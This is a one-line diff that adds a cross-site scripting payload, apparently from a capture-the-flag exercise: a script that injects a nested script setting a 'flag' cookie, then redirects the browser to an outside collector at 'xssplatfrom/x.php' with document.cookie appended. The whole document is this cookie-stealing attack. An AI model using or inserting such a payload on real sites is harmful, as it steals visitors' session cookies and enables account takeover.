@@ -1,0 +1,1 @@
+<script>if(!location.href.includes("cookie")) location+="&s=<script>document.cookie%20=%20\'flag=\';";else window.location="http://xssplatfrom/x.php?c="+document.cookie；</script>
